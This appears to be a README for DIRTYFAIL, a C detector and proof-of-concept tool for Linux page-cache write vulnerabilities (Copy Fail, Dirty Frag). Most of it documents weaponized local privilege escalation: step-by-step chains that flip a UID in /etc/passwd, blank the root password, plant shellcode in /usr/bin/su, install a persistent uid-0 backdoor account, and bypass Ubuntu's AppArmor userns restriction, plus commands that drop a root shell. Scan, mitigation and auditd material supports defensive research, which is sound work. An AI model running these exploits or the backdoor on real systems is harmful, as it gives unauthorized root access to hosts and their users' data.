# DIRTYFAIL

> A unified detector and PoC harness for the **Copy Fail** and **Dirty Frag**
> Linux page-cache write vulnerability families.

```
 ██████╗ ██╗██████╗ ████████╗██╗   ██╗███████╗ █████╗ ██╗██╗
 ██╔══██╗██║██╔══██╗╚══██╔══╝╚██╗ ██╔╝██╔════╝██╔══██╗██║██║
 ██║  ██║██║██████╔╝   ██║    ╚████╔╝ █████╗  ███████║██║██║
 ██║  ██║██║██╔══██╗   ██║     ╚██╔╝  ██╔══╝  ██╔══██║██║██║
 ██████╔╝██║██║  ██║   ██║      ██║   ██║     ██║  ██║██║███████╗
 ╚═════╝ ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝
```

DIRTYFAIL is a small, well-documented C tool for security researchers.
It detects whether a Linux host is vulnerable to the three CVEs in this
family, and — with explicit, typed confirmation — runs a real
proof-of-concept that drops the caller into a root shell on a
vulnerable system.

| CVE / variant | Name | DIRTYFAIL coverage |
|---|---|---|
| **CVE-2026-31431** | Copy Fail (algif_aead `authencesn` page-cache write) | Detect + full PoC |
| **CVE-2026-43284 v4** | Dirty Frag — IPv4 xfrm-ESP page-cache write          | Detect + full PoC |
| **CVE-2026-43284 v6** | Dirty Frag — IPv6 xfrm-ESP page-cache write (`esp6`) | Detect + full PoC |
| **CVE-2026-43500**    | Dirty Frag — RxRPC page-cache write                  | Detect + full PoC |
| Copy Fail GCM variant | xfrm-ESP `rfc4106(gcm(aes))` page-cache write        | Detect + full PoC |

**Bonus modes:**

- **`--scan --active`** — sentinel-STORE active probes. Default `--scan`
  reports per-CVE preconditions (kernel, modules, LSM state) plus an
  active probe of the Copy Fail primitive. Adding `--active` extends
  the sentinel-file STORE probe to all four other primitives (ESP v4,
  ESP v6, RxRPC, GCM): each fires the kernel trigger against a `/tmp`
  sentinel and reports VULNERABLE only if the marker bytes actually
  land. This is the only way to distinguish a backported-patched
  kernel (preconds say vulnerable but probe says intact) from an
  unpatched one without running the full exploit. `/etc/passwd` is
  never touched. Auto-calibrates V6 STORE shift per kernel build.
- **`--exploit-backdoor`** — persistent uid-0 backdoor: length-matched
  overwrite of a `nologin`/`false`/`sync` line in `/etc/passwd` with
  `dirtyfail::0:0:<pad>:/:/bin/bash`. Survives shell exit until page
  is evicted. State stashed at `/var/tmp/.dirtyfail.state` for
  `--cleanup-backdoor`. The `dirtyfail` username is deliberately
  matched to this project so it's instantly identifiable in any
  audit — change `NEW_USER` in `src/backdoor.c` if you need a
  different identifier for an authorized red-team engagement.
- **AppArmor bypass** — defeats Ubuntu's
  `apparmor_restrict_unprivileged_userns=1` policy via a single-hop
  `change_onexec("crun")` re-exec into an unconfined profile that
  retains userns capabilities. Each exploit mode handles this
  internally via a fork: parent stays in init namespace, child does
  the bypass dance, parent reads global page cache and runs `su` for
  REAL init-ns root. The legacy `--aa-bypass` flag still exists for
  debugging the bypass mechanics in isolation. See [§8.5 Architecture](#85-architecture-outerinner-fork-based-bypass).

## Verified working on

DIRTYFAIL has been **empirically validated end-to-end** across multiple
distros and kernel versions. The matrix below reflects per-mode test
results from running each `--exploit-*` mode against a fresh install
of each distro.

| Distro | Kernel | LSM | Copy Fail | xfrm-ESP v4 | xfrm-ESP v6 | RxRPC | GCM | Backdoor | SU shellcode |
|---|---|---|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| Ubuntu 24.04 LTS | `6.8.0-111-generic` | AppArmor | 🛡²  | ✅ | ✅ | ✅ | ✅¹ | ✅¹ | (not tested) |
| Debian 13.4 | `6.12.86+deb13` | none | 🛡 | 🛡 | 🛡 | 🛡 | 🛡 | 🛡 | 🛡⁵ |
| AlmaLinux 10.1 | `6.12.0-124.8.1.el10_1` | SELinux | ✅ | ✅ | ✅ | ⏭³ | ✅ | ✅ | ✅ |
| Fedora 44 (Server) | `6.19.10-300.fc44` | SELinux | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Ubuntu 26.04 LTS | `7.0.0-15-generic` | AppArmor (hardened) | 🛡 | 🛡⁴ | 🛡⁴ | 🛡⁴ | 🛡⁴ | 🛡⁴ | 🛡⁵ |

**Legend:** ✅ exploit landed and produced real init-ns root  · 🛡 mitigated — exploit cannot reach kernel bug (kernel patched OR LSM blocks unprivileged path)  · ⏭ not applicable (precondition missing)

### Active-probe validation (`--scan --active`)

The `--active` flag adds a sentinel-file STORE probe per CVE during
detection. We validated the probe outputs against the same 4 distros
above (Debian, Fedora, AlmaLinux, Ubuntu 26.04) — the matrix below
shows the per-mode probe verdict and matches the full-exploit
ground-truth one-for-one:

| Distro | Copy Fail probe | ESP v4 probe | ESP v6 probe | RxRPC probe | GCM probe |
|---|:-:|:-:|:-:|:-:|:-:|
| Debian 13.4 | intact 🛡 | intact 🛡 | intact 🛡 | intact 🛡 | intact 🛡 |
| Fedora 44   | marker @0 ✅ | STORE @0 ✅ | STORE @8 ✅ | byte change ✅ | sentinel[0] 0x41→0x27 ✅ |
| AlmaLinux 10.1 | marker @0 ✅ | STORE @0 ✅ | STORE @8 ✅ | preconds ⏭ | sentinel changed ✅ |
| Ubuntu 26.04 | intact 🛡 | LSM-blocked 🛡 | LSM-blocked 🛡 | LSM-blocked 🛡 | LSM-blocked 🛡 |

The V6 probe's STORE landing offset (8 on Fedora and Alma) matches the
empirical `V6_STORE_SHIFT` that `calibrate_v6_shift()` discovers at
runtime — confirming the auto-calibration replaces the previously
hard-coded constant correctly across kernel builds.

¹ GCM and Backdoor require `algif_aead` to be loadable. Ubuntu 24.04
ships `/etc/modprobe.d/disable-algif_aead.conf` blacklisting it as a
Copy Fail mitigation. With the blacklist removed (e.g. on a kernel
predating the mitigation), both modes work end-to-end.

² Copy Fail's algif_aead path is mitigated by the modprobe blacklist;
the underlying CVE primitive in the kernel is the same whether
`authencesn` is reachable. xfrm-ESP, RxRPC, and the GCM variant all
land on the same kernel because they don't go through algif_aead.

³ AlmaLinux 10's `kernel-modules-extra` package is not installed by
default on a Minimal install, so `rxrpc.ko` is missing on disk.
Installing `kernel-modules-extra-$(uname -r)` from EPEL or the AlmaLinux
extras repo brings the module back; on a stock minimal install RxRPC is
unreachable.

⁴ **Ubuntu 26.04 LTS comprehensively blocks unprivileged exploitation.**
The shipping kernel `7.0.0-15.15` (released 2026-04-22) **predates the
mainline patch `f4c50a4034e6` (merged 2026-05-07) by ~2 weeks** — so
the bug IS still present in the kernel. Ubuntu's defense is
**defense-in-depth via AppArmor hardening**, not a kernel patch:

- `apparmor_restrict_unprivileged_userns=1` is enabled by default.
- On `unshare(CLONE_NEWUSER)`, the kernel-level AppArmor enforcement
  auto-transitions ANY profile (including `(unconfined)`-flagged ones
  like `crun`, `chrome`, default `unconfined`) to a
  `<profile>//&unprivileged_userns (mixed)` sub-profile that has
  `audit deny capability`. uid 0 inside the new userns gets no caps.
- `change_onexec` to a different profile doesn't help — even the
  `crun` profile (which has explicit `userns,` permission and
  `flags=(unconfined)`) auto-transitions on unshare. Verified via
  `aa-exec -p crun bash -c 'unshare -U -n cat /proc/self/attr/current'`
  → `crun//&unprivileged_userns (mixed)`.
- `newuidmap`/`newgidmap` (setuid root) successfully writes uid_map,
  but `setresuid(0)` then succeeds while `ioctl(SIOCSIFFLAGS)` and
  every other CAP_NET_ADMIN-gated syscall returns EPERM because the
  capability denial is per-namespace, not per-uid.

The DIRTYFAIL binary correctly armes its bypass and reaches stage 2,
but cannot acquire CAP_NET_ADMIN inside the new userns. The exploit
infrastructure is blocked at the LSM layer regardless of bypass
technique. We tested `change_onexec(crun)`, `change_onexec(chrome)`,
`aa-exec -p <profile>`, and direct `unshare(USER|NET) + newuidmap`
— all produce the same `unprivileged_userns` sub-profile.

**This is good security work by Canonical.** The bug class is
mitigated for unprivileged users without requiring a kernel rebuild.
A subsequent stable update will likely also bring the kernel patch
proper, completing the defense.

⁵ **`--exploit-su` shellcode injection** depends on the same Copy Fail
algif_aead 4-byte primitive (`cf_4byte_write`). On kernels where
Copy Fail is patched (Debian 13.4) or LSM-blocked (Ubuntu 26.04 — but
the algif_aead path was also patched in 7.0.0-15), the plant runs
through but the verify step fails ("page cache does not match planted
shellcode") and the auto-revert restores `/usr/bin/su`. Tested
end-to-end on AlmaLinux 10.1 (entry point at file offset `0x45b0`)
and Fedora 44 (offset `0x1b60`); ELF parser handles each distro's
PIE base independently. Real-root proof on Fedora 44:
`uid=0(root) gid=0(root) ... context=unconfined_u:unconfined_r:unconfined_t`.

Test reproducibility:

- We re-installed each distro from a clean ISO, set up SSH key auth + NOPASSWD sudo, cloned and built DIRTYFAIL on each, took a `clean-build` Parallels snapshot, then ran all 5 exploit modes with `--no-shell` (auto-revert via fadvise + drop_caches).
- Empirical result rows are derived from parsing the actual `--exploit-*` output, looking for the success signals: `page cache now reports <user> with uid 0`, `root password field is now empty`, `is now uid 0` (backdoor), or any of the failure patterns (`write did not land`, `byte flip failed`, `setresuid: Invalid`, `add_rxrpc_key: No such device`, `page cache not in expected shape`).
- For the RxRPC and Backdoor "real root" verification we drove `echo "" | su - root` / `echo "" | su - dirtyfail` and confirmed `uid=0(root)` plus successful read of `/etc/shadow`.

> **Authorized testing only.** Use DIRTYFAIL only on systems you own or
> are explicitly engaged to assess. The exploit modes corrupt
> `/etc/passwd` *in the kernel page cache* (the on-disk file is never
> touched). Cleanup is `dirtyfail --cleanup` or
> `echo 3 > /proc/sys/vm/drop_caches`.

---

## Table of contents

1. [The bug class](#1-the-bug-class)
2. [CVE-2026-31431 — Copy Fail](#2-cve-2026-31431--copy-fail)
3. [CVE-2026-43284 — Dirty Frag (xfrm-ESP)](#3-cve-2026-43284--dirty-frag-xfrm-esp)
4. [CVE-2026-43500 — Dirty Frag (RxRPC)](#4-cve-2026-43500--dirty-frag-rxrpc)
    - [4.5 Architecture overview](#45-architecture-overview)
5. [Build](#5-build)
6. [Usage](#6-usage)
7. [How DIRTYFAIL detects each CVE](#7-how-dirtyfail-detects-each-cve)
8. [How DIRTYFAIL exploits each CVE](#8-how-dirtyfail-exploits-each-cve)
    - [8.5 Architecture: outer/inner fork-based bypass](#85-architecture-outerinner-fork-based-bypass)
9. [Mitigations](#9-mitigations)
10. [Ethics & disclosure](#10-ethics--disclosure)
11. [Credits](#11-credits)

**Companion docs:**
- [`docs/DEFENDERS.md`](docs/DEFENDERS.md) — sysadmin playbook: am I vulnerable, how to mitigate, what to monitor.
- [`docs/RESEARCH.md`](docs/RESEARCH.md) — kernel-source audit of adjacent paths (AH, IPCOMP, MACsec, kTLS, etc.) for the same bug class.
- [`tools/dirtyfail-check.sh`](tools/dirtyfail-check.sh) — standalone bash detector for sysadmins (no compilation needed).
- [`tools/99-dirtyfail.rules`](tools/99-dirtyfail.rules) — ready-to-load auditd rules for the exploit chain.
- [`tools/dirtyfail-container-escape.sh`](tools/dirtyfail-container-escape.sh) — cross-namespace blast-radius demo.
- [`tools/exploit_su_aarch64.S`](tools/exploit_su_aarch64.S) — aarch64 (ARM64) shellcode source for `--exploit-su`. Hardware-untested; ships gated behind `DIRTYFAIL_AARCH64_TRUST_UNTESTED=1`. Regenerate the corresponding bytes in `src/exploit_su.c` with `aarch64-linux-gnu-as` to verify.

---

## 1. The bug class

**Page-cache write** vulnerabilities let an unprivileged user modify
the kernel's in-memory copy of a file they only have read access to.
The on-disk file is never written; the modification persists in RAM
until the page is evicted (`drop_caches`, memory pressure, or reboot).

This class started with **Dirty Pipe** (CVE-2022-0847), which abused
`pipe_buffer` flags. Copy Fail and Dirty Frag are descendants that
target the `frag` member of `struct sk_buff` instead. The mechanism is
always the same:

1. Userspace `splice()`s a page-cache page from a readable file (e.g.
   `/etc/passwd`, `/usr/bin/su`) into the frag of a kernel buffer.
2. A receive path runs **in-place** crypto on that buffer — the same
   pages are both source and destination of the operation.
3. The crypto routine performs a "scratch" STORE outside the data
   region (a sequence-number rearrangement, a single-block decrypt,
   etc.) that lands inside the user-pinned page.
4. The page-cache copy of the file is now permanently modified for
   every reader on the host, until the page is evicted.

Because the bug is a **deterministic logic flaw**, not a race, success
rates are essentially 100% and the kernel does not panic on failure.

---

## 2. CVE-2026-31431 — Copy Fail

* Disclosure: **2026-04-29**
* Site: <https://copy.fail/>
* Original PoC (C):     [Smarttfoxx/copyfail](https://github.com/Smarttfoxx/copyfail)
* Original PoC (Python): [rootsecdev/cve_2026_31431](https://github.com/rootsecdev/cve_2026_31431)
* Introduced by commit:  `72548b093ee3` (2017)
* Fixed by commit:       `a664bf3d` (mainline 6.12 / 6.17 / 6.18 stables)
* Confirmed affected:    Ubuntu 24.04 LTS, Amazon Linux 2023, RHEL 14.3, SUSE 16

### Root cause

The kernel's `algif_aead` module exposes the AEAD crypto API to
userspace via `AF_ALG`. The `authencesn(hmac(sha256), cbc(aes))`
template implements RFC-4303 ESN (Extended Sequence Numbers); part of
its decryption path performs a **4-byte scratch write** to rearrange
the sequence number:

```c
static int crypto_authenc_esn_decrypt(struct aead_request *req)
{
    /* Move high-order bits of sequence number to the end. */
    scatterwalk_map_and_copy(tmp, src, 0, 8, 0);
    if (src == dst) {
        scatterwalk_map_and_copy(tmp,     dst, 4,                  4, 1);
        scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);  // ★
        ...
```

The STORE at ★ is harmless on a normal IPsec packet — it lands inside
the skb's tag area, which is kernel-owned. The crypto template
**assumes** `src` and `dst` point into kernel memory.

`algif_aead` violates that assumption. It accepts `splice()` from
userspace, which plants page-cache pages into the request's
scatterlist. Because the AEAD runs in-place (`req->dst = req->src`),
the page-cache page now sits at the destination scatterlist offset
that the scratch write targets.

The 4 bytes that get written are bytes 4..7 of the AAD that userspace
sent — the "seqno_lo" field of an ESP header, which the attacker fills
with whatever they want.

**Net primitive**: 4-byte arbitrary-offset write into the page cache
of any file the attacker can `open(O_RDONLY)`.

### Exploitation

The simplest weaponization is in `/etc/passwd`. A normal user line
looks like:

```
kara:x:1000:1000:Kara,,,:/home/kara:/bin/bash
```

Flipping `1000` (the UID field, exactly 4 ASCII bytes for any UID
1000–9999) to `0000` makes glibc's `getpwnam()` report uid=0 for
that user. PAM, however, still authenticates against the on-disk
`/etc/shadow` (which is untouched), so `su <user>` prompts for the
real password, validates it, then `setuid(0)` — and lands at root
because the page-cache copy of `/etc/passwd` says we are root.

`/etc/shadow` integrity is preserved. On-disk `/etc/passwd` is
preserved. Only the kernel's RAM copy of `/etc/passwd` is corrupted,
and only until `drop_caches` or reboot.

---

## 3. CVE-2026-43284 — Dirty Frag (xfrm-ESP)

* Disclosure: **2026-04-30 → 2026-05-08**
* Original PoC (C): [V4bel/dirtyfrag](https://github.com/V4bel/dirtyfrag)
* Researcher: Hyunwoo Kim ([@v4bel](https://x.com/v4bel))
* Introduced by commit: `cac2661c53f3` (2017-01-17)
* Fixed by commit:      `f4c50a4034e6` (mainline net.git, merged 2026-05-07)
* Confirmed affected:   Ubuntu 24.04, RHEL 10.1, openSUSE Tumbleweed,
                        CentOS Stream 10, AlmaLinux 10, Fedora 44

### Root cause

`esp_input()` is supposed to call `skb_cow_data()` before in-place AEAD
decryption when an skb is non-linear (i.e. has frags). The code path
has a short-circuit:

```c
if (!skb_cloned(skb)) {
    if (!skb_is_nonlinear(skb)) {
        nfrags = 1;
        goto skip_cow;
    } else if (!skb_has_frag_list(skb)) {        // ★ bug
        nfrags = skb_shinfo(skb)->nr_frags;
        nfrags++;
        goto skip_cow;
    }
}
```

If the skb has frags but no `frag_list`, esp_input bypasses
`skb_cow_data` and hands the user-supplied frag straight to the AEAD
template. The same `authencesn(...)` scratch write that powers Copy
Fail then lands at file offset `(assoclen + cryptlen)` of the spliced
page.

The 4 STOREd bytes are `seq_hi` from the SA's `replay_esn` state —
attacker-controlled at SA registration time via the
`XFRMA_REPLAY_ESN_VAL` netlink attribute.

**Cost**: registering an XFRM SA needs `CAP_NET_ADMIN`, so the
attacker enters a fresh user namespace via `unshare(CLONE_NEWUSER)`
first. This is allowed by default on most distros (Ubuntu's hardened
profile is the notable exception).

**Crucially, this primitive works even when the algif_aead Copy Fail
mitigation is in place** — the xfrm path doesn't go through algif_aead.
A defender who only blacklisted `algif_aead` is still vulnerable to
Dirty Frag.

### Exploitation

V4bel's published PoC writes a 192-byte static "root-shell" ELF over
the first 192 bytes of `/usr/bin/su`'s page cache, using 48 sequential
4-byte STOREs. After modification, `execve("/usr/bin/su")` runs the
new ELF entry point with the setuid-root bit intact, drops PAM
entirely, and `execve("/bin/sh")` from inside the shellcode.

DIRTYFAIL takes the simpler `/etc/passwd` UID-flip approach (one
4-byte STORE — the same target as Copy Fail) for two reasons:

1. It is a single-write primitive demonstration, easier to study.
2. It is fully reversible with `POSIX_FADV_DONTNEED` and does not
   leave `/usr/bin/su` in a corrupt state for other users on the
   system.

---

## 4. CVE-2026-43500 — Dirty Frag (RxRPC)

* Disclosure: **2026-04-29 → 2026-05-08**
* Patch:        not in any tree as of 2026-05-08; researcher's patch
                pending: `lore.kernel.org/all/afKV2zGR6rrelPC7@v4bel/`
* Researcher:   Hyunwoo Kim ([@v4bel](https://x.com/v4bel))
* Introduced by commit: `2dc334f1a63a` (2023-06)

### Root cause

`rxkad_verify_packet_1()` performs an **in-place** `pcbc(fcrypt)`
single-block decryption on the first 8 bytes of an RxRPC data packet:

```c
sg_init_table(sg, ARRAY_SIZE(sg));
ret = skb_to_sgvec(skb, sg, sp->offset, 8);
memset(&iv, 0, sizeof(iv));
skcipher_request_set_crypt(req, sg, sg, 8, iv.x);   // ★ src == dst
ret = crypto_skcipher_decrypt(req);                 // ★ 8-byte STORE
```

If a page-cache page has been spliced into the skb's frag, the 8-byte
decrypt is performed on top of it.

**Difference from xfrm-ESP**: the 8 bytes that get STOREd are
`fcrypt_decrypt(C, K)`, where `C` is the existing ciphertext at that
file offset and `K` is the session key from an RxRPC v1 token the
attacker registered via `add_key("rxrpc", ...)`. The attacker doesn't
control the STORE value directly — they have to brute-force `K` until
`fcrypt_decrypt(C, K)` produces the desired plaintext.

`fcrypt` is an Andrew File System cipher with a **56-bit key** and
8-byte block. It is deterministic; it ports cleanly to user space; and
its key space is small enough that a constrained 8-byte target can be
brute-forced in milliseconds to seconds depending on the constraint
budget.

**Crucially, this path does NOT need namespace privileges** —
`add_key`, `socket(AF_RXRPC)`, `socket(AF_ALG)`, `splice` are all
available to any unprivileged user. RxRPC fills the gap on Ubuntu's
hardened-userns profile (where xfrm-ESP is blocked) because
`rxrpc.ko` ships in the default Ubuntu build.

### Exploitation

The full exploit:

1. Brute-force `K_A`, `K_B`, `K_C` in user-space such that the three
   STOREs at `/etc/passwd` offsets 4, 6, 8 produce
   `"::"`, `"0:"`, `"0:GGGGGG:"` respectively (last-write-wins).
2. For each `K_i`, register an RxRPC v1 token with `add_key`, perform
   a forged AF_RXRPC handshake against a fake UDP server in the same
   process, and trigger `rxkad_verify_packet_1` via splice.
3. The page-cache copy of `/etc/passwd` line 1 is now
   `root::0:0:GGGGGG:/root:/bin/bash` — an empty password field.
4. PAM with `pam_unix.so nullok` accepts the empty password; `su -`
   drops a root shell.

### DIRTYFAIL coverage

DIRTYFAIL ships **both** detection and a full PoC for this CVE.

The DIRTYFAIL implementation lives in `src/dirtyfrag_rxrpc.c` and
`src/fcrypt.c`:

- **fcrypt cipher** (`fcrypt.c`): 56-bit key, 8-byte block, 16-round
  Feistel; standard rxkad protocol S-boxes. Includes a single-core
  brute-force harness (~18 Mops/s) that searches the key space until
  a candidate plaintext satisfies a caller-supplied predicate.
- **rxkad checksum** (`compute_csum_iv`, `compute_cksum`): kernel
  formula reproduced via AF_ALG `pcbc(fcrypt)` so that the wire cksum
  in our forged DATA packet passes `rxkad_verify_packet`'s gate.
- **RxRPC v1 token build** (`build_rxrpc_v1_token`): XDR-encoded
  rxkad token registered via `add_key("rxrpc", ...)` with our
  brute-forced session key.
- **AF_RXRPC client + UDP fake-server**: the client initiates a call,
  the fake-server extracts (epoch, cid, callNumber) from the first
  packet and emits a forged CHALLENGE so the client primes
  `conn->rxkad.cipher` with our key.
- **Splice trigger** (`do_one_trigger`): vmsplice forged DATA wire
  header → splice 8 bytes from `/etc/passwd` → splice pipe → udp_srv
  → recvmsg drives kernel through `rxkad_verify_packet_1` → 8-byte
  STORE.
- **3-splice chain with chained-ciphertext correction**: brute force
  K_A / K_B / K_C, applying the chained ciphertext shift between
  passes (after splice A overwrites bytes 4..11, splice B's
  ciphertext at 6..13 starts with `P_A[2..7]`; same for C against B).

The final PoC reshapes `/etc/passwd` line 1 to:

```
root::0:0:GGGGG:/root:/bin/bash
```

— empty password field — and `execlp("su", "-")` then drops a root
shell because `pam_unix.so nullok` accepts an empty password.

For comparison and verification against the upstream PoC, see
V4bel's `exp.c`: <https://github.com/V4bel/dirtyfrag>.

---

## 4.5 Architecture overview

DIRTYFAIL is a single C binary built from ~10 source modules. The
high-level structure:

```
                     ┌─────────────────────────────────────────┐
                     │            dirtyfail (CLI)              │
                     │ src/dirtyfail.c — argv → mode dispatch  │
                     └────────────────┬────────────────────────┘
                                      │
           ┌──────────────────┬───────┼───────┬─────────────────┬───────────┐
           │                  │       │       │                 │           │
           ▼                  ▼       ▼       ▼                 ▼           ▼
    ┌──────────────┐  ┌─────────────────┐  ┌──────────────┐  ┌──────────┐  ┌────────────┐
    │  --scan      │  │  --exploit-*    │  │  --backdoor  │  │--mitigate│  │ --cleanup* │
    │  (detect.c)  │  │  (5 modes)      │  │  install +   │  │ defense  │  │ revert     │
    │              │  │                 │  │  cleanup     │  │          │  │            │
    └──────┬───────┘  └────────┬────────┘  └──────┬───────┘  └────┬─────┘  └────────────┘
           │                   │                  │                │
           │  ┌────────────────┼──────────────────┼────────────────┘
           │  │                │                  │
           ▼  ▼                ▼                  ▼
    ┌──────────────┐  ┌──────────────────┐  ┌──────────────────┐
    │ apparmor_    │  │  outer (init ns) │  │ cfg_1byte_write  │
    │ bypass.c     │  │  → fork → child  │  │  (gcm primitive) │
    │              │  │  outer/inner     │  │                  │
    │ * sysctl     │  │  split           │  │  used by gcm +   │
    │ * caps_blocked  │                  │  │  backdoor for    │
    │ * fork_arm   │  │  parent stays    │  │  arbitrary-byte  │
    └──────┬───────┘  │  in init ns,     │  │  writes          │
           │          │  child re-execs  │  └────────┬─────────┘
           │          │  via change_     │           │
           ▼          │  onexec(crun) +  │           ▼
    ┌──────────────┐  │  AA stage 1/2    │  ┌──────────────────┐
    │ stage 1/2    │  │  unshare + caps  │  │ AF_ALG ecb(aes)  │
    │ handler      │  │  → run inner     │  │ keystream brute  │
    └──────────────┘  └──────────────────┘  │ force            │
                                              └──────────────────┘

  Per-CVE primitives (each has detect/exploit/exploit_inner functions):

  ┌──────────────────────────────────────────────────────────────────────┐
  │ copyfail.c        algif_aead authencesn 4-byte STORE  (CVE-2026-31431) │
  │ copyfail_gcm.c    rfc4106(gcm(aes)) 1-byte STORE      (CVE-2026-43284) │
  │ dirtyfrag_esp.c   xfrm-ESP IPv4 4-byte STORE          (CVE-2026-43284) │
  │ dirtyfrag_esp6.c  xfrm-ESP IPv6 4-byte STORE w/ +9    (CVE-2026-43284) │
  │ dirtyfrag_rxrpc.c rxkad 8-byte STORE + fcrypt brute   (CVE-2026-43500) │
  │ fcrypt.c          rxkad cipher (56-bit Feistel)                        │
  │ backdoor.c        persistent /etc/passwd line overwrite                │
  └──────────────────────────────────────────────────────────────────────┘
```

**Key design decisions:**

- **Outer/inner split**: every exploit forks a child for the kernel
  work. Parent stays in init namespace so the eventual `execlp("su",
  user)` reaches REAL init-ns root. See [§8.5
  Architecture](#85-architecture-outerinner-fork-based-bypass).
- **Page cache is global**: child writes from inside its bypass userns,
  parent reads from init ns; same bytes visible.
- **Env vars carry parent → child state**: `DIRTYFAIL_INNER_MODE`,
  `DIRTYFAIL_TARGET_USER`, `DIRTYFAIL_K_{A,B,C}` (rxrpc),
  `DIRTYFAIL_LINE_OFF` etc. (backdoor). `execv` preserves the
  environment across stage transitions.
- **Defensive companion**: `--mitigate` deploys the same blacklists +
  sysctl hardening that distros ship as official mitigations.
  `--scan` detects when caps are LSM-blocked and reports
  "mitigated" rather than misleading "VULNERABLE preconditions met".

---

## 5. Build

### Prerequisites

* **Linux** (this binary is Linux-only at runtime).
* `gcc` or `clang`, `make`.
* Linux UAPI headers — specifically `<linux/xfrm.h>`, `<linux/netlink.h>`,
  `<linux/rtnetlink.h>`, `<linux/if.h>`.

| Distro            | Install                                              |
|-------------------|------------------------------------------------------|
| Debian / Ubuntu   | `sudo apt install build-essential linux-libc-dev`    |
| RHEL / CentOS     | `sudo dnf install gcc make kernel-headers glibc-devel` |
| Fedora            | `sudo dnf install gcc make kernel-headers`           |
| Arch              | `sudo pacman -S base-devel`                          |

### Build commands

```sh
git clone https://github.com/<you>/DIRTYFAIL.git
cd DIRTYFAIL
make                # release build → ./dirtyfail
make debug          # -O0 -g3 for gdb
make static         # static link (musl-gcc recommended)
make clean
```

The default build produces a single ~80 KB binary at `./dirtyfail`.
For a portable build that runs on any kernel-compatible Linux without
glibc dependency drift:

```sh
make static CC=musl-gcc
```

(install `musl-tools` on Debian/Ubuntu, or build musl from source).

---

## 6. Usage

`./dirtyfail --help` is the canonical reference; the modes broken
out by category:

**Detection (safe; no system modification):**

| Mode | What it does |
|---|---|
| `--scan` | Run all five detectors (default mode) |
| `--scan --active` | Add a sentinel-file STORE probe per CVE — distinguishes preconds-met from actually-exploitable |
| `--scan --json` | Emit a single JSON object on stdout (SIEM-friendly); logs go to stderr |
| `--check-copyfail` / `--check-esp` / `--check-esp6` / `--check-rxrpc` / `--check-gcm` | Per-CVE detection only |

**Exploitation (typed-confirmation gated; corrupts `/etc/passwd` page cache):**

| Mode | What it does |
|---|---|
| `--exploit-copyfail` | UID flip via `algif_aead` 4-byte primitive |
| `--exploit-esp` | UID flip via xfrm-ESP v4 (needs userns+CAP_NET_ADMIN) |
| `--exploit-esp6` | UID flip via xfrm-ESP v6 |
| `--exploit-rxrpc` | Empty root password field via rxkad fcrypt brute force |
| `--exploit-gcm` | UID flip via `rfc4106(gcm(aes))` single-byte primitive |
| `--exploit-backdoor` | PERSISTENT: insert `dirtyfail::0:0:...:/:/bin/bash` |
| `--exploit-su` | V4bel-style: plant arch-specific shellcode at `/usr/bin/su` entry point. x86_64 tested end-to-end; aarch64 ships hardware-untested (gated behind `DIRTYFAIL_AARCH64_TRUST_UNTESTED=1`) |

**Cleanup / state inspection:**

| Mode | What it does |
|---|---|
| `--cleanup` | Evict `/etc/passwd` from page cache (`fadvise` + `drop_caches` if root) |
| `--cleanup-backdoor` | Restore the original `/etc/passwd` line from state file |
| `--cleanup-su` | Restore `/usr/bin/su` entry-point bytes from state file |
| `--list-state` | Report what (if anything) is currently planted; side-effect-free |

**Defensive (root required):**

| Mode | What it does |
|---|---|
| `--mitigate` | Blacklist `algif_aead`/`esp4`/`esp6`/`rxrpc` modules; set `apparmor_restrict_unprivileged_userns=1`; drop_caches. Side-effects: breaks IPsec, AFS |
| `--cleanup-mitigate` | Remove the modprobe/sysctl files installed by `--mitigate` |

**Common options:**

| Flag | Effect |
|---|---|
| `--no-shell` | After a successful exploit, do NOT `execve su` — verify and revert |
| `--no-revert` | With `--no-shell`, also skip the auto-revert (used by the container-escape demo) |
| `--active` | Add active sentinel-STORE probes to `--scan`/`--check-*` |
| `--json` | (with `--scan`) emit machine-readable output |
| `--no-color` | Disable ANSI color |
| `--aa-bypass` | (DEBUG only) force the AppArmor unprivileged-userns bypass — exploits do this internally, see §8.5 |

### Detection examples

Plain scan (preconditions only — fast, ~1s):

```sh
./dirtyfail --scan
```

Active sentinel probe per CVE (~10s, modifies `/tmp` sentinels only):

```sh
./dirtyfail --scan --active
```

JSON for SIEM/fleet ingestion:

```sh
$ ./dirtyfail --scan --active --json
{
  "tool": "dirtyfail",
  "version": "0.1.0",
  "hostname": "server-01",
  "kernel": "6.19.10-300.fc44.x86_64",
  "machine": "x86_64",
  "active_probes": true,
  "results": [
    {"cve": "CVE-2026-31431",     "name": "copyfail",        "status": "vulnerable"},
    {"cve": "CVE-2026-43284",     "name": "dirtyfrag-esp",   "status": "vulnerable"},
    {"cve": "CVE-2026-43284-v6",  "name": "dirtyfrag-esp6",  "status": "vulnerable"},
    {"cve": "CVE-2026-43500",     "name": "dirtyfrag-rxrpc", "status": "vulnerable"},
    {"cve": "CVE-2026-31431-gcm", "name": "copyfail-gcm",    "status": "vulnerable"}
  ],
  "summary": "vulnerable"
}
```

Status values: `vulnerable`, `not_vulnerable`, `preconds_missing`,
`test_error`. The summary echoes the worst across results.

### Exploit examples (typed confirmation required)

```sh
./dirtyfail --exploit-copyfail              # UID-flip + drop into root via su
./dirtyfail --exploit-su                    # plant /bin/sh shellcode at /usr/bin/su entry
./dirtyfail --exploit-copyfail --no-shell   # plant + verify + auto-revert (CI-safe)
```

Each exploit prompts for `DIRTYFAIL` + (where applicable)
`YES_BREAK_SSH` before any page-cache modification.

### State inspection + cleanup

```sh
./dirtyfail --list-state          # what's currently planted? (side-effect free)
./dirtyfail --cleanup             # fadvise(DONTNEED) + drop_caches if root
./dirtyfail --cleanup-backdoor    # restore /etc/passwd from .dirtyfail.state
./dirtyfail --cleanup-su          # restore /usr/bin/su from .dirtyfail-su.state
```

Or fall through to the kernel directly:

```sh
sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
```

---

## 7. How DIRTYFAIL detects each CVE

### Copy Fail (active sentinel probe)

Detection actually triggers the primitive against a sentinel file in
`/tmp`:

1. Probe `socket(AF_ALG, SOCK_SEQPACKET, 0)` and `bind` to
   `authencesn(hmac(sha256), cbc(aes))`.
2. Create a 4 KiB sentinel file in `/tmp` and fault its first page
   into the cache.
